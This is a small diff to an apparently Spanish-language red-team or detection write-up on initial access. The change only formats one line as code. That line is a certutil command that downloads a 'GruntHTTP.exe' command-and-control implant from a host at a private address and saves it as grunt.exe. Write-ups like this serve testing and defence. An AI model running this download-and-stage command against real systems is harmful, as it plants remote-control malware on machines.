@@ -113,7 +113,7 @@ Y una segunda alerta, la conexión entre ambos equipos
 
 Tenemos otras opciones para descargar el fichero, como puede ser certutil
 
-certutil.exe -urlcache -split -f http://192.168.2.14:8000/GruntHTTP.exe grunt.exe
+`certutil.exe -urlcache -split -f http://192.168.2.14:8000/GruntHTTP.exe grunt.exe`
 
 
 ![image010.png](/uploads/InitialAccess/image010.png)
